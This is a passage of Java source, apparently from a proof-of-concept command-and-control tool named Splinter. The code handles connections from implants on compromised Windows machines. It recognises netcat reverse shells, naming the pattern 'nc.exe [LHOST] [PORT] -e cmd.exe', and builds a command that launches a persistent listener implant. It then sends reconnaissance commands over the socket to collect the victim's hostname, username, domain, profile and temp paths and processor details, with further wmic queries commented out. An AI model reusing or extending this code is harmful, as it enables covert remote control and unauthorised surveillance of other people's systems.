			//strToReturn = "start " + myImplantInitialLaunchDirectory + listenerBinaryFileName + " " + Splinter_GUI.STARTUP_IMPLANT_LISTEN_FOR_MULTIPLE_CONNECTIONS + " " + port;
			strToReturn = "start " + "." + Driver.fileSeperator + listenerBinaryFileName + " " + Driver.STARTUP_IMPLANT_LISTEN_FOR_MULTIPLE_CONNECTIONS + " " + port;
		}
		catch(Exception e)
		{
			Drivers.eop("reformatShortcut_ESTABLISH_PERSISTEN_LISTENER", this.strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return strToReturn;
	}
	
	 /**
	   * 
	   * VITAL: DO NOT CHANGE THE ORDER COMMANDS ARE ISSUED HERE
	   * IF YOU WANT TO ADD, ADD AT THE END OF THE METHOD!!!!!
	   * 
	   * This Netcat is the newer version of windows command prompt
	   * 
	   * I'm not going to program much here... as I don't expect to find this cmd.exe in the wild and since this is a POC, 
	   * I'll have to add more to these calls later
	   * 
	   * @param brSocket
	   * @return
	   */
	  public boolean interrogateNewAgent_NETCAT_OLDER(BufferedReader brSocket)
	  {		  
		  try
		  {
			//at this point, we have read the first 2 lines from the agent: "Microsoft windows [Version ...]" and "(C) Copyright..." Read the 3rd line.  This should be blank and continue from there
    		        		
    		//read the next line --> should be blank!
    		String strThirdLine = brSocket.readLine();      		
    		
    		if(strThirdLine != null && strThirdLine.trim().equals(""))
        	{
    			//yup, third line is blank, definitely appears to be nc.exe [LHOST] [PORT] -e cmd.exe
        		//Drivers.sop("Third line is blank as expected when cmd.exe is used with the implant" + " ##>Confidence level for netcat: 75% --> I am reading the final line to determine the netcat execution path");
    			Drivers.sop("-->>> Almost there... Confidence level is 75% ...");
        		          		    
        		//send a blank line to see the final input provided
        		sendCommand_RAW("");
        		
        		//read the next line --> should be blank!
        		String strFourthLine = brSocket.readLine();          		
        		
        		if(strFourthLine != null && strFourthLine.trim().endsWith(">"))
            	{
        			//as best as we can, this is a netcat machine, indicate accordingly
            		//Drivers.sop("Final line contains search parameter \">\" which appears to be the initial launch directory of this implant. I will label this implant netcat" + " ##>Confidence level for netcat: 100% --> I am sending commands to better interrogate the system now...");
        			Drivers.sop("-->>>> OK. So as best as I can tell, this is a netcat agent. I will label this implant netcat" + " -->>>> Confidence level for netcat: 100% -->>>> I am sending commands to better interrogate the system now...");
              		
            		
            		/*******************
            		 * SET IMPLANT ID
            		 *******************/
            		this.myIMPLANT_ID = Driver.IMPLANT_ID_NETCAT;
            		try{this.myImplantName = Driver.ARR_IMPLANT_NAME[myIMPLANT_ID];}catch(Exception e){this.myImplantName = "UNKNOWN";}
            		
            		i_am_NETCAT_Agent = true;
            		//done!!!!!
            		//proceed to interrogate the system
            		
            		myImplantInitialLaunchDirectory = strFourthLine;
            		
            		//read final line to clear buffer
            		brSocket.readLine();
            	}
        		
        	}
    		
    		
			  sendCommand_RAW("hostname");
		      brSocket.readLine();//get rid of echoed command
		      this.myHostName = brSocket.readLine();
		      
		     
		     
		      sendCommand_RAW("echo %username%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myUserName = brSocket.readLine();      
		      
		
		      sendCommand_RAW("echo %homedrive%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myHomeDrive = brSocket.readLine();
		     if(myHomeDrive != null && myHomeDrive.trim().equals("%homedrive%"))
		     {
		    	 myHomeDrive = " - ";
		     }
		      
		      
		
		      sendCommand_RAW("echo %NUMBER_OF_PROCESSORS%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myNumberOfProcessors = brSocket.readLine();
		      
		      sendCommand_RAW("echo %OS%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myOS_Type = brSocket.readLine();
		
		      sendCommand_RAW("echo %PROCESSOR_ARCHITECTURE%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myProcessorArchitecture = brSocket.readLine();
		
		      sendCommand_RAW("echo %SystemRoot%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.mySystemRoot = brSocket.readLine();
		
		      sendCommand_RAW("echo %USERDOMAIN%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myUserDomain = brSocket.readLine();
		
		      sendCommand_RAW("echo %USERPROFILE%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myUserProfile = brSocket.readLine();
		
		      sendCommand_RAW("echo %TEMP%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myTempPath = brSocket.readLine();
		
		    //I'm stopping here for now... more development will be needed if necessary
	    		Drivers.sop("PUNT!!!  Nope. I am stopping the interrogation of this system early.  I did not expect to encounter an agent running an older version of cmd.exe and it is unclear if I can interact with wmic on the target.  If needed, contact Splinter and ask for the methods to continue the interrogation.");
	    		
	    		return true;
		      	
		      
		      /*sendCommand_RAW("wmic os get caption /value");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myOS = brSocket.readLine();
		      try { this.myOS = this.myOS.replace("Caption=", ""); }
		      catch (Exception e){}
		      brSocket.readLine();   //clear the buffer after the execution of the above wmic command
		      brSocket.readLine();
		      brSocket.readLine();
		      
		      
		      sendCommand_RAW("wmic os get CSDVersion /value");      
		      brSocket.readLine();
		      brSocket.readLine();   
		      brSocket.readLine();    
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();//issue command
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myServicePack = brSocket.readLine();
		      try { this.myServicePack = this.myServicePack.replace("CSDVersion=", ""); }
		      catch (Exception e)      {      }
		      
		      
		      
		      sendCommand_RAW("wmic os get CountryCode /value");
		      brSocket.readLine();
		      brSocket.readLine();   
		      brSocket.readLine();    
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myCountryCode = brSocket.readLine();
		      try { this.myCountryCode = this.myCountryCode.replace("CountryCode=", ""); }
		      catch (Exception e)      {      }
		      
		      
		      
		      sendCommand_RAW("wmic os get NumberOfUsers /value");
		      brSocket.readLine();
		      brSocket.readLine();   
		      brSocket.readLine();    
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myNumberOfUsers = brSocket.readLine();
		      try { this.myNumberOfUsers = this.myNumberOfUsers.replace("NumberOfUsers=", ""); }
		      catch (Exception e)      {      }
		      
		      
		      
		      
		      sendCommand_RAW("wmic os get Version /value");
		      brSocket.readLine();
		      brSocket.readLine();   
		      brSocket.readLine();    
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myVersionNumber = brSocket.readLine();
		      try { this.myVersionNumber=this.myVersionNumber.replace("Version=", ""); }
		      catch (Exception e)      {      }
		      
		      
		      
		      
		      sendCommand_RAW("wmic os get SerialNumber /value");
		      brSocket.readLine();
		      brSocket.readLine();   
		      brSocket.readLine();    
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.mySerialNumber = brSocket.readLine();
		      try { this.mySerialNumber = this.mySerialNumber.replace("SerialNumber=", ""); }
		      catch (Exception e)      {      }
		      
		      sendCommand_RAW("wmic os get OSArchitecture /value");
		      brSocket.readLine();
		      brSocket.readLine();   
		      brSocket.readLine();    
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myOS_Architecture = brSocket.readLine();
		      try { this.myOS_Architecture = this.myOS_Architecture.replace("OSArchitecture=", ""); } catch (Exception e) {}
		      
	      return true;*/
    		
	    }
	    catch (Exception e)
	    {
	      Drivers.eop("interrogateNewAgent_NETCAT_OLDER", this.strMyClassName, e, e.getLocalizedMessage(), false);      
	    }
		  
		  return false;
	  }
	
	
	
	
	
}
